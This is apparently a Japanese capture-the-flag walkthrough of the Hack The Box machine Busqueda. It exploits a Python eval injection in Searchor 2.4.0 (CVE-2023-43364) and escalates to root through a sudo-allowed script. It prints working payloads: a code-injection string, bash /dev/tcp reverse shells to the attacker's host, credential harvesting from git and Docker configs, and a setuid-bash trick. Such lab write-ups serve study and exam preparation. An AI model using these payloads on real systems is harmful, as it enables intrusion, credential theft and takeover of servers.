---
title: HTB - Busqueda
date: 2025-02-01 00:30:00 +0900
categories: [Hack The Box, Linux]
tags: [nmap, cve-2023-43364, searchor-2.4.0, python, gitea, docker, mysql, htb-busqueda, hackthebox, linux, ctf, sudo]     # TAG names should always be lowercase
published: true
description: 「Busqueda」とは、簡単な難易度のLinuxマシンはでした。このボックスでは、ウェブスクレイピングや検索クエリのURL取得に使用されるPythonパッケージ「Searchor」を実行するウェブサイトが動作しています。任意のコードインジェクション脆弱性を悪用して、リモートコード実行（RCE）を達成します。マシンに侵入した後、sudo権限が与えられたPythonスクリプトが見つかり、それを悪用して権限昇格を達成します。
lang: ja
---

今回はHack The BoxのRetired Machine(すでにポイントの対象外となった過去問)の1つである「Busqueda」というマシンの攻略アプローチを紹介いたします。

![Busqueda](/assets/img/posts/htb-busqueda/Busqueda.png){: .center }
_Busqueda Machine info card_


#### マシン情報テーブル

| [Hack The BoxでBusquedaを攻略しよう！](https://app.hackthebox.com/machines/537)  |
| 難易度         | 簡単   |
| OS   | Linux       |
| 公開日     | 2023年04月09日  |
| マシンの状態| 引退|

#### 今回解くマシンは？

「Busqueda」とは、簡単な難易度のLinuxマシンはでした。このボックスでは、ウェブスクレイピングや検索クエリのURL取得に使用されるPythonパッケージ「Searchor」を実行するウェブサイトが動作しています。任意のコードインジェクション脆弱性を悪用して、リモートコード実行（RCE）を達成します。マシンに侵入した後、sudo権限が与えられたPythonスクリプトが見つかり、それを悪用して権限昇格を達成します。

#### 攻略手順概要

攻略アプローチを考えるにあたり、ここではMITRE ATT&CKをガイドラインとして活用してみます。

MITRE ATT&CKに照らした攻略手順の概要は以下の通りです。

| Enterprise tactics           | Technique                              | Software / Tool |
| :--------------------------- | :------------------------------------- | :-------------- |
| TA0007: Discovery            | T1046: Network Service Scanning        | nmap            |
| TA0008: Lateral Movement     | T1210: Exploitation of Remote Services | CVE-2023-43364  |
| TA0006: Credential Access    | T1552.001: Credentials in Files        | gitea           |
| TA0004: Privilege Escalation | T1548.003: Sudo and Sudo Caching       |                 |

## TA0007: Discovery <span class="english">(Reconnaissance)</span>
#### T1046: Network Service Scanning

##### TCPポートスキャン

いつものようにまず、`nmap`を使用して、全のTCPポートをスキャンを実行し、開いているポートを見つけていきます。

```bash
0hmsec@kali:-$ nmap -p- --min-rate 10000 10.10.11.208
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 17:24 IST
Nmap scan report for 10.10.11.208
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

nmapの結果を見ると`2`ポートが開いていること(open)が確認できます。これから開いているTCPポートにサービスとバージョン検出スキャンを実行していきます。

```bash
0hmsec@kali:-$ nmap -p22,80 -sC -sV 10.10.11.208 -oA nmap/tcp-scan
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 17:26 IST
Nmap scan report for 10.10.11.208
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
```

nmapの結果を見ると、「Did not follow redirect to `http://searcher.htb/`」という文章はマシンのホスト名の兆候が表示されます。これを `/etc/hosts` ファイルに追加する前に、まず `wfuzz`を使用してサブドメインを検索してみましょう。

```bash
0hmsec@kali:-$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://searcher.htb' -H "Host: FUZZ.searcher.htb" --hw 26
```

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://searcher.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000009532:   400        10 L     35 W       304 Ch      "#www"
000010581:   400        10 L     35 W       304 Ch      "#mail"

Total time: 77.70970
Processed Requests: 19966
Filtered Requests: 19964
Requests/sec.: 256.9305
```

「#www や #mail」のように「#」ついているサブドメインが見つかった場合、それらは正しいサブドメインはないので無視したら構いません。だからこそ、`/etc/hosts` ファイルに `searcher.htb` を追加しましょう。

```bash
0hmsec@kali:-$ echo -n "10.10.11.208 searcher.htb searcher" | sudo tee -a /etc/hosts
```
```bash
[sudo] password for 0hmsec: 
10.10.11.208 searcher.htb searcher
```

##### UDPポートスキャン

今まで開いているTCPポートの中でなにかセキュリティ脆弱性を見つける可能性がD十分あります。でもUDPポートスキャンも忘れずに実行しておくことがおすすめです。UDPポートスキャンは時間がかかります。なので開いているTCPポートを調べる同時にUDPポートスキャンを実行することが良いです。このことが習慣になったらいつか役に立つんだと思います。

今回は`nmap`を使用して、全のUDPポートをスキャンを新しいターミナルで実行し、開いているポートを見つけていきます。忘れずにTCPポートを調べる同時にする練習をしてみてくださいね。

```bash
0hmsec@kali:-$ nmap -p- -sU --min-rate 10000 10.10.11.208
```

nmapの結果を見ると`0`ポートが開いていること確認できます。ポートが見つからないため、これ以上スキャンを続けません。

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 17:29 IST
Warning: 10.10.11.208 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.208
Host is up (0.039s latency).
All 65535 scanned ports on 10.10.11.208 are in ignored states.
Not shown: 65458 open|filtered udp ports (no-response), 77 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 72.87 seconds
```

###  ウェブサイト発見

`http://searcher.htb`に行ってみると、以下のウェブサイトを見えます。

![Website](/assets/img/posts/htb-busqueda/ss1.png){: .center }
_http://searcher.htb_

ウェブサイトを見るとこれが[Flask](https://flask.palletsprojects.com/en/stable/)アプリケーションであることは明らかです。[Searchor](https://github.com/ArjunSharda/Searchor)というウェブスクレイピングや検索クエリのURL取得に使用されるPythonパッケージも存在してることが確認できます。

Amazon を選択して「Laptop」を検索すると、`/search` ページに移動し、以下の URL が返されます。

![searcher](/assets/img/posts/htb-busqueda/ss2.png){: .center }
_Searchor_

![/search](/assets/img/posts/htb-busqueda/ss3.png){: .center }
_http://searcher.htb/search_

同じことを「Auto redirect」を有効にして行くと、そのページのURLを見せるだけじゃなくて、そのページにリダイレクトされます。

![/search](/assets/img/posts/htb-busqueda/ss4.png){: .center }
_Auto redirect enabled_

![/search](/assets/img/posts/htb-busqueda/ss5.png){: .center }
_Amazon search results_

## TA0008: ラテラルムーブメント

### CVE-2023-43364
#### SearchorのCLIのSearchにある任意のコードインジェクション脆弱性

[このページ](https://github.com/ArjunSharda/Searchor/security/advisories/GHSA-66m2-493m-crh2)を見ると、ここで対処している脆弱性を理解することができます。

あのページには、セキュリティ パッチがバージョン 2.4.2 以上に適用されていると記載されているため、詳細については [セキュリティ パッチ ページ](https://github.com/ArjunSharda/Searchor/pull/130)を確認しましょう。

![Searchor security patch](/assets/img/posts/htb-busqueda/ss6.png){: .center }
_Searchor security patch_

このスクリーンショットで写っているように、バージョン2.4.2では`eval()`関数が削除され、任意のコードの実行が防止されていることがわかります。

しかし、今回はSearchorバージョン2.4.0を扱っているため、この脆弱性を悪用してリモートコード実行（RCE）を行い、最終的にシェルを取得する必要があります。

#### ローカルテスト

この任意コード・インジェクションがどのように機能するかを正確に確認してみましょう。このパッケージをテストするために、Pythonバーチャル環境を使用しています。

```bash
0hmsec@kali:-$ python3 -m venv myenv
0hmsec@kali:-$ source myenv/bin/activate

(myenv) 0hmsec@kali:-$ pip install searchor==2.4.0
Collecting searchor==2.4.0
  Downloading searchor-2.4.0-py3-none-any.whl.metadata (5.3 kB)
Collecting pyperclip (from searchor==2.4.0)
  Downloading pyperclip-1.9.0.tar.gz (20 kB)
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting aenum (from searchor==2.4.0)
  Downloading aenum-3.1.15-py3-none-any.whl.metadata (3.7 kB)
Collecting click (from searchor==2.4.0)
  Using cached click-8.1.8-py3-none-any.whl.metadata (2.3 kB)
Downloading searchor-2.4.0-py3-none-any.whl (8.0 kB)
Downloading aenum-3.1.15-py3-none-any.whl (137 kB)
Using cached click-8.1.8-py3-none-any.whl (98 kB)
Building wheels for collected packages: pyperclip
  Building wheel for pyperclip (pyproject.toml) ... done
  Created wheel for pyperclip: filename=pyperclip-1.9.0-py3-none-any.whl size=11049 sha256=3081b4738faa6afc809071be3c9a243513eb565d271b89d72a260bef7076e4cd
  Stored in directory: /home/kali/.cache/pip/wheels/e0/e8/fc/8ab8aa326e33bc066ccd5f3ca9646eab4299881af933f94f09
Successfully built pyperclip
Installing collected packages: pyperclip, aenum, click, searchor
Successfully installed aenum-3.1.15 click-8.1.8 pyperclip-1.9.0 searchor-2.4.0
```

```bash
(myenv) 0hmsec@kali:-$ searchor --help
Usage: searchor [OPTIONS] COMMAND [ARGS]...

Options:
  --help  Show this message and exit.

Commands:
  history
  search

(myenv) 0hmsec@kali:-$ searchor search --help
Usage: searchor search [OPTIONS] ENGINE QUERY

Options:
  -o, --open  Opens your web browser to the generated link address
  -c, --copy  Copies the generated link address to your clipboard
  --help      Show this message and exit.
```

この[Github pull request ページ](https://github.com/ArjunSharda/Searchor/pull/130)によると、脆弱性が`search`コマンドライン(CLI)コマンドに存在していたことがわかります。

脆弱性を悪用するためには、下の関数を悪用する必要があります。

```python
url = eval(
    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)
```

コードの実行の脆弱性を確認するためには２つのことが必要です。
1. 適切なPythonシンタックスで書かれたれた有効なLinuxコマンドが必要で、
2. searchor コマンドは、「ENGINE」と「QUERY」という 2 つのオプションを取ります。これら２つの中でどちらに任意のLinuxのコマンドを渡す必要があるのかを見つける必要があります。

#### ペイロードの説明

ちょっとグーグルで検索して試行錯誤した後は適切なPythonシンタックスを見つけました。

```python
' + __import__('os').popen('whoami').read() + '
```

- `__import__('os')`: OSと対話するためのPythonのOSモジュールを動的にインポートします。
- `.popen('whoami')`: 「whoami」というシェルコマンドを実行します。
- `.read()`: コマンド実行のアウトプットを読み取ります。
- `'` and `+`: F-stringの正しいシンタックスを実現するために最初と最後に追加します。

#### ローカルコード実行

では、このコマンドを「ENGINE」と「QUERY」に１つずつ引数として渡して試してみましょう。

まずはENGINEに渡していきます。

```bash
(myenv) 0hmsec@kali:-$ searchor search "' + __import__('os').popen('whoami').read() + '" Laptop

Traceback (most recent call last):
  File "/home/kali/hackthebox/machines/Linux/Busqueda/myenv/bin/searchor", line 8, in <module>
    sys.exit(cli())
             ^^^^^
  File "/home/kali/hackthebox/machines/Linux/Busqueda/myenv/lib/python3.12/site-packages/click/core.py", line 1161, in __call__
    return self.main(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/hackthebox/machines/Linux/Busqueda/myenv/lib/python3.12/site-packages/click/core.py", line 1082, in main
    rv = self.invoke(ctx)
         ^^^^^^^^^^^^^^^^
  File "/home/kali/hackthebox/machines/Linux/Busqueda/myenv/lib/python3.12/site-packages/click/core.py", line 1697, in invoke
    return _process_result(sub_ctx.command.invoke(sub_ctx))
                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/hackthebox/machines/Linux/Busqueda/myenv/lib/python3.12/site-packages/click/core.py", line 1443, in invoke
    return ctx.invoke(self.callback, **ctx.params)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/hackthebox/machines/Linux/Busqueda/myenv/lib/python3.12/site-packages/click/core.py", line 788, in invoke
    return __callback(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/hackthebox/machines/Linux/Busqueda/myenv/lib/python3.12/site-packages/searchor/main.py", line 32, in search
    url = eval(
          ^^^^^
  File "<string>", line 1
    Engine.' + __import__('os').popen('whoami').read() + '.search('Laptop', copy_url=False, open_web=False)
           ^^^^^^^^^^^^^^^^
SyntaxError: invalid syntax
```

「ENGINE」引数で渡すとシンタックスエラーが出ます。では、「QUERY」引数で渡してみましょう。

```bash
(myenv) 0hmsec@kali:-$ searchor search Amazon "' + __import__('os').popen('whoami').read() + '"
https://www.amazon.com/s?k=0hmsec%0A
```

攻撃成功！攻撃しているマシンのハンドルネームが出力で見えるからSearchor 2.4.0 の「QUERY」引数でローカルコード実行が成功したことが理解できます。

### T1210: Exploitation of Remote Services
#### Shell as svc

この脆弱性に対するリバースシェルを取得できる2つの方法を紹介します。

##### 方法-1:

リバースシェルのコードがこちらになります。

```bash
bash -c 'bash -i >& /dev/tcp/{RHOST}/{RPORT} 0>&1'
```

これをペイロードに入れる前に、base-64エンコードしてからしたほうがおすすめです。

```bash
0hmsec@kali:-$ echo -ne "bash -c 'bash -i >& /dev/tcp/KALI_IP/PORT 0>&1'" | base64
```

最終ペイロードがこちらになります。

```python
' + __import__('os').popen('echo {BASE64_ENCODED_CODE}|base64 -d|bash -i').read() + '
```

ペイロードを渡す前に、「netcat」リスナーを実行する必要があります。「http://searcher.htb/」サイトの「What do you want to search for: 」フィールドに直接渡します。

![RCE](/assets/img/posts/htb-busqueda/ss7.png){: .center }
_RCE_

その結果、netcat上でユーザー「svc」としてリバースシェルを取得できます。

```bash
0hmsec@kali:-$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.208] 55120
bash: cannot set terminal process group (1595): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ 
```

##### 方法-2:

リバースシェルを取得するためのPythonプログラムを作成しました。[こちら](https://github.com/0hmsec/Searchor-2.4.0-Arbitrary-CMD-Injection-Python/tree/main)で見つけることができます。

```bash
0hmsec@kali:-$ python3 CVE-2023-43364.py -u http://searcher.htb/ -rh 10.10.10.11 -rp 8888
Connection Established Successfully.
Trying to open a reverse shell on 10.10.10.11 at 8888...
```

その結果、リバースシェルを取得できます。自分にとって楽な方法を使用してください。

###### シェル アップグレード

取得したリバース シェルは不安定である可能性があります。そのため、シェルをアップグレードします。

```bash
svc@busqueda:/var/www/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@busqueda:/var/www/app$ ^Z
zsh: suspended  nc -nvlp 8888

0hmsec@kali:-$ stty raw -echo; fg
[1]  + continued  nc -nvlp 8888
                               reset
reset: unknown terminal type unknown
Terminal type? screen
svc@busqueda:/var/www/app$ 
```

#### USER flag

```bash
svc@busqueda:~$ cd /var/www/app
svc@busqueda:/var/www/app$ cd /home/svc
svc@busqueda:~$ cat user.txt
12a9020b67......................
```

とうとうuser.txtフラッグを見つかりましたね。万歳!おめでとうー

---

## TA0006: クレデンシャルアクセス <span class="english">(Credential Access)</span>
### T1552.001: Credentials in Files

調査すると、`/var/www/app`ディレクトリに`.git`フォルダを見つけました。その中で`config`ファイルを見つけました。

```bash
svc@busqueda:/var/www/app/.git$ cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

`config`ファイルで見つけたのは、
1. `gitea.searcher.htb`サブドメインの参考、
2. ユーザーの認証情報 - `cody` : `jh1usoih2bkjaspwe92`

`/etc/hosts`ファイルを`gitea.searcher.htb`で更新した後、http://gitea.searcher.htbにアクセスできるようになりました。

![gitea.searcher.htb](/assets/img/posts/htb-busqueda/ss8.png){: .center }
_gitea.searcher.htb_

なお、「cody」の認証情報が正しかったです。

![cody](/assets/img/posts/htb-busqueda/ss9.png){: .center }
_Gitea login_

![cody](/assets/img/posts/htb-busqueda/ss10.png){: .center }
_cody's gitea_

ここで見つられたのは、
1. ウェブサイトのコード、
2. 「administrator」というgiteaのもう１つのユーザーの存在もわかりました。

## TA0004: 権限昇格 <span class="english">(Privilege Escalation)</span>
### T1548.003: Sudo and Sudo Caching

他に重要な情報がないので、ターミナルに戻ってユーザーのsudo権限を確認しましょう。

```bash
svc@busqueda:/var/www/app$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

`/opt/scripts/system-checkup.py`というPythonスクリプトがsudo権限与えられていることが理解できます。

```bash
svc@busqueda:/var/www/app$ ls -l /opt/scripts/system-checkup.py
-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
```

ファイルの権限のせいでこのスクリプトを読めないです。でも、「svc」ユーザーがsudo権限で実行することができます。

`sudo -l`の出力でコマンドの最後に`*`が入力しているので引数を渡すことが必要になります。そうしないとコマンドが実行できません。しかも、`sudo`なしでも実行できません。

```bash
svc@busqueda:/var/www/app$ /usr/bin/python3 /opt/scripts/system-checkup.py
Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py
Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.
```

どの引数を渡すべきだとはっきりわかりませんので、「blah」というランダム言葉を引数として渡して見ましょう。

```bash
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py blah
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

コマンドの実行が成功でした。出力を見ると`docker-ps`オプションは[docker ps](https://docs.docker.com/reference/cli/docker/container/ls/)にと`docker-inspect`オプションは[docker inspect](https://docs.docker.com/reference/cli/docker/inspect/)に似ていることがわかります。最後のオプション`full-checkup`はカスタム関数のようです。１つずつ確認してみましょう。

##### docker-ps

```bash
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

コマンドの実行が成功で、「gitea」と「mysql_db」という２つのDockerコンテナが実行していることがわかりました。

##### docker-inspect

```bash
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

出力によると「docker-inspect」は「format」と「container_name」という２つのオプションが渡すべきだそうです。「docker-inspect」の「--format」引数に関する[ドキュメント](https://docs.docker.com/engine/cli/formatting/)を確認すると、`{% raw %}{{json .}}{% endraw %}`を使用したら全内容がJSON形式で表示されることがわかります。また、構造化されたJSON出力を見るためには`jq`コマンドを使用する必要があります。

この前の「docker-ps」コマンドの出力でコンテナが「gitea」と「mysql_db」という２つあったことがわかりました。それ１つずつ渡してみましょう。

```bash
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{% raw %}{{json .}}{% endraw %}' gitea | jq .
```

「gitea」引数を渡してみるともう知っていると情報しかわからなかったです。だから、「mysql_db」引数を渡してみましょう。

```bash
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{% raw %}{{json .}}{% endraw %}' mysql_db | jq .
```

この出力を詳しく見る前に最後のオプションである「full-checkup」も実行してみましょう。

##### full-checkup

```bash
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

すぐにエラーが発生します。もっと情報を集めてからこのオプションに戻りましょう。

### TA0006: クレデンシャルアクセス <span class="english">Credential Access</span>
#### T1552.001: Credentials in Files

「docker-inspect」コマンドを`{% raw %}{{json .}}{% endraw %}`で実行したときは、全ての内容が表示されました。その中で、必要な情報が`{% raw %}{{json .Config}}{% endraw %}`と`{% raw %}{{json .NetworkSettings}}{% endraw %}`の２つのセレクターを使用することで取得できます。

```bash
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{% raw %}{{json .Config}}{% endraw %}' mysql_db | jq .
---[snip]---
  "Env": [
    "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
    "MYSQL_USER=gitea",
    "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
    "MYSQL_DATABASE=gitea",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "GOSU_VERSION=1.14",
    "MYSQL_MAJOR=8.0",
    "MYSQL_VERSION=8.0.31-1.el8",
    "MYSQL_SHELL_VERSION=8.0.31-1.el8"
  ],
---[snip]---
```

```bash
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{% raw %}{{json .NetworkSettings}}{% endraw %}' mysql_db | jq .
---[snip]---
      "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
      "EndpointID": "eea91ceddc532967b57b6f3dbf8642601be679ce209932e755125b04bca2ea5b",
      "Gateway": "172.19.0.1",
      "IPAddress": "172.19.0.3",
      "IPPrefixLen": 16,
      "IPv6Gateway": "",
      "GlobalIPv6Address": "",
      "GlobalIPv6PrefixLen": 0,
      "MacAddress": "02:42:ac:13:00:03",
      "DriverOpts": nu
---[snip]---
```

出力を見ると、
1. 「mysql」インスタンスを実行しているdockerコンテナのIPアドレスと
2. 「mysqlデータベース」の認証情報が知ることができました。

##### mysqlデータベースへの接続

```bash
svc@busqueda:/var/www/app$ mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh  
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 874
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

入れました。それでは、データベースを調べて、役に立つ情報がないかどうか調べてみましょう。

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| performance_schema |
+--------------------+

mysql> use gitea;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show tables;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
---[snip]---
| two_factor                |
| upload                    |
| user                      |
| user_badge                |
| user_open_id              |
---[snip]---

mysql> SHOW COLUMNS FROM user;
+--------------------------------+---------------+------+-----+---------+----------------+
| Field                          | Type          | Null | Key | Default | Extra          |
+--------------------------------+---------------+------+-----+---------+----------------+
| id                             | bigint        | NO   | PRI | NULL    | auto_increment |
| lower_name                     | varchar(255)  | NO   | UNI | NULL    |                |
| name                           | varchar(255)  | NO   | UNI | NULL    |                |
| full_name                      | varchar(255)  | YES  |     | NULL    |                |
| email                          | varchar(255)  | NO   |     | NULL    |                |
| keep_email_private             | tinyint(1)    | YES  |     | NULL    |                |
| email_notifications_preference | varchar(20)   | NO   |     | enabled |                |
| passwd                         | varchar(255)  | NO   |     | NULL    |                |
---[snip]---

mysql> SELECT name, passwd FROM user;       
+---------------+------------------------------------------------------------------------------------------------------+
| name          | passwd                                                                                               |
+---------------+------------------------------------------------------------------------------------------------------+
| administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

もうユーザーcodyのパスワードを知っています。「administrator」のパスワードを解読する前にデータベースのパスワードを使用して、http://gitea.searcher.htb/ でユーザーadministratorとしてログインしてみましょう。

![administrator](/assets/img/posts/htb-busqueda/ss11.png){: .center }
_Gitea login_

成功！入れました。ちゃんと調べてみると、sudo権限を与えられた`system-checkup.py`のソースコードを見えます。

```python
---[snip]---
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
---[snip]---
```

コードをアナライズして見ると、`full-checkup`オプションの「if」ステートメントが見つかりました。そのステートメントによると、カレントディレクトリから`full-checkup.sh`というスクリプトを実行しようとしていることがわかるでしょう。それだけじゃなくて、「Something went wrong」というエラーから、この前実行したときは「full-checkup.sh」というスクリプトを見つけられませんでしたということがわかるでしょう。

### Shell as root

だからこそ、カレントディレクトリでカスタム`full-checkup.sh`を作成し、任意の bashコードを入力してから`system-checkup.py` pythonスクリプトを実行します。ルートシェルを取得する方法は2つあります。

#### 方法-1: netcatのリバースシェル

一番簡単な方法だというとnetcatリスナーをスタートし、以下のコードを使用するリバースシェルをキャッチすることです。

```bash
svc@busqueda:/tmp$ echo -ne '#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.14.21/8888 0>&1' > full-checkup.sh
svc@busqueda:/tmp$ chmod +x full-checkup.sh
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
```

それでリバースシェル、キャッチ！

```bash
0hmsec@kali:-$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.208] 45534
root@busqueda:/tmp# 

```

#### 方法-2:

グーグルで調べてたとき、[0xdf](https://www.twitter.com/0xdf_)さんが書かれた[この記事](https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html)を見つけました。そこで`setuid`に存在している脆弱性を悪用してもルートシェルを取得できることがわかります。

```bash
svc@busqueda:/tmp$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/temp_bash\nchmod 4777 /tmp/temp_bash' > full-checkup.sh
```

`/bin/bash`を一時ファイル`/tmp/temp_bash`にコピーし、この一時ファイルにsetuidビットを完全な権限を与えるスクリプトを書いています。したがって、`/tmp/temp_bash`を実行すると、ルートシェルを取得できます。

```bash
svc@busqueda:/tmp$ chmod +x full-checkup.sh 
svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup
svc@busqueda:/tmp$ /tmp/temp_bash -p
temp_bash-5.1# whoami
root
```

#### ROOT flag

とうとうroot.txtフラッグも見つかりましたね。

>いつも申し上げてるように、もしOSCP+試験を受ける方なら、フラッグ見つかった証明スクショを撮るときには`type root.txt`、`whoami`と`ipconfig`、この3つのコマンドの結果が写っていなければなりません。以下の例みたいに撮ってください。OSCP+試験には"root.txt"は"proof.txt"になりますから気をつけてくださいね。
{: .prompt-tip }

```bash
temp_bash-5.1# cat /root/root.txt
eeff9a68b3a....................

temp_bash-5.1# whoami
root

temp_bash-5.1# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:88:30 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.208/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:8830/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:8830/64 scope link 
       valid_lft forever preferred_lft forever
3: br-cbf2c5ce8e95: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:4f:36:ba:a3 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-cbf2c5ce8e95
       valid_lft forever preferred_lft forever
    inet6 fe80::42:4fff:fe36:baa3/64 scope link 
       valid_lft forever preferred_lft forever
4: br-fba5a3e31476: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:bc:ab:b6:76 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-fba5a3e31476
       valid_lft forever preferred_lft forever
5: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:ff:15:ca:e2 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
